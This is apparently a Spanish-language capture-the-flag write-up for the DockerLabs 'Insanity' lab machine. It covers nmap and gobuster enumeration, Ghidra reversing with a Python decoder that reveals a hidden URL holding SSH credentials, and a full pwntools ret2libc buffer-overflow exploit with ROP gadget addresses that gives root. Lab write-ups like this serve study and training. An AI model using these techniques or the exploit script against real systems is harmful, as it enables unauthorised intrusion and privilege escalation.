nmap: 22,80

![image](https://github.com/user-attachments/assets/9a5132f3-0a20-4689-8f07-2f6823477b83)

si entramos a la pagina es un apache como nombra en el nmap, entramos al código fuente y nos mostrara esto

![image](https://github.com/user-attachments/assets/5a899861-971f-45a2-beae-b6e4991f89c1)

lanzamos un gobuster 

     gobuster dir -u http://insanity.dl/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -x html,php,txt -t 100 -k

y obtenemos 

![image](https://github.com/user-attachments/assets/5ba202fc-7a78-4e33-81a2-bf844081ce3d)

entramamos y obtenemos

![image](https://github.com/user-attachments/assets/c86393b4-2728-4a69-8cdb-396aa439403e)

los descargamos y ejecutamos

![image](https://github.com/user-attachments/assets/4de4dd06-7a32-4ff1-a316-ea41755b6da0)

con secret obtenemos que es una clave incorrecta y con libcredenciales.so da segmentation fault, probando no obtenemos nada. así que vamos a utilizar ghidra para ver el contenido del código 

Lo importante que entendí del código
> Primero que hay un wget así que descarga un archivo
> g(): Define un arreglo de valores o sea local_4d8, local_4d4 y así. 
> usa b() para convertir estos valores en una cadena
> También  llama a "a()" para cada valor en un arreglo de enteros
>o sea vería así: b(long param_1, int param_2, long param_3)

así que basado en esto podemos decodificar con un código python

![image](https://github.com/user-attachments/assets/4cdd940e-c5a3-4c7c-9d40-189b4e6bfdf4)

con este código lo vamos a lanzar con python3

     def transform_value(value):
    special_cases = {
        0x1B: 0x3A,
        0x1C: 0x2F,
        0x1D: 0x2E,
        0x1E: 0x5F
    }
    
    if value in special_cases:
        return special_cases[value]
    elif 1 <= value <= 0x1A:
        return value + 0x60
    else:
        return 0x3F
        
        def convert_values_to_string(values):
    return "".join(chr(transform_value(value)) for value in values)
    
    values = [
    8, 20, 20, 16, 27, 28, 28, 9, 14, 19, 1, 14, 9, 20, 25, 29, 4, 12, 28, 21,
    12, 20, 18, 1, 30, 19, 5, 3, 18, 5, 20, 30, 6, 15, 12, 4, 5, 18, 11, 13, 1 ]
    result = convert_values_to_string(values)
    print("Resultado:", result)


y obtenemos esto

![image](https://github.com/user-attachments/assets/6e3e218e-779d-4a2d-b7ef-cf7153ea8469)

> http://insanity.dl/ultra_secret_folderkma

![image](https://github.com/user-attachments/assets/630ea875-f856-43a2-82ae-5ff2f9c65a4f)

tenemos las credenciales de SSH

![[dockerlabs/dificil/Insanity/conexion.png]]

tenemos la conexión ahora vamos buscando y encontramos esto

![[over.png]]

vamos a lanzar ahí mismo 

     gdb -q ./vuln

ahora colocamos los que nos dio el código

     /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 400 

![[meta.png]]

ahora en el gdb lanzamos una r y ahora colocamos el resultado

![[resul.png]]

obtenemos este resultado

    0x0000000000401189 in vuln ()

ahora lanzamos en nuestra terminal

    python2 -c 'print("A"*136 + "BBBBBB")'

en el gdb lanzamos run y colocamos el nuevo resultado y obtenemos

    0x0000424242424242 in ?? ()

![[resul2.png]]

entonces cambio porque en el primer "ataque" aparece la protección, si lanzamos un "info frame" mostrara si se ejecuta correctamente pero como se vio muestra la protección, ahora que lanzamos tomando en cuenta el "136" le sumamos las B o sea "136 + 6 B"
y podemos obtener el ultimo resultado. ahora quedaría encontrar la direccion de memoria que seria el "sh"

![[memoria.png]]

veremos si esta ahí y efectivamente esta 

![[memoria2.png]]

ahora seria buscar la dirección de memoria pero de system, con el comando 

    p system

y nos dará

![[system.png]]

encontré este comando que es para ver si se encuentra ahí
 
     ROPgadget --binary ./vuln

de muchas lineas que nos da, nos interesa una

     0x0000000000401016 : ret

así que obtenemos la dirección de ret, ahora buscamos la de pop rdi

     ROPgadget --binary ./vuln | grep "pop rdi"

y me dio

     0x0000000000401165 : mov dl, byte ptr [rbp + 0x48] ; mov ebp, esp ; pop rdi ; nop ; pop rbp ; ret
     0x0000000000401168 : mov ebp, esp ; pop rdi ; nop ; pop rbp ; ret
     0x0000000000401167 : mov rbp, rsp ; pop rdi ; nop ; pop rbp ; ret
     0x000000000040116a : pop rdi ; nop ; pop rbp ; ret
     0x0000000000401166 : push rbp ; mov rbp, rsp ; pop rdi ; nop ; pop rbp ; ret

la que buscábamos es la 

     0x000000000040116a 

ahora con todos los valores creamos un código python que contenga los valores

![[exploit.png]]


este es el código 

     from pwn import *
     binary_path = '/opt/vuln'
     binary = ELF(binary_path)
     p = process(binary_path)
     
     gadgets = {
    "pop_rdi_ret": 0x40116a,
    "ret": 0x401016         
    }
    addresses = {
    "bin_sh": 0x7ffff7f73031, 
    "system": 0x7ffff7e29490  
    }
    
    offset = 136                  
    payload = b"A" * offset        
    payload += p64(gadgets["pop_rdi_ret"])  
    payload += p64(addresses["bin_sh"])     
    payload += p64(gadgets["ret"])         
    payload += p64(addresses["system"])    
    
    def exploit():
    p.sendline(payload)
    p.interactive()
    
    if __name__ == "__main__":
    exploit()


ahora los pasamos a la maquina victima y lo ejecutamos

![[dockerlabs/dificil/Insanity/root.png]]

y somos root! 
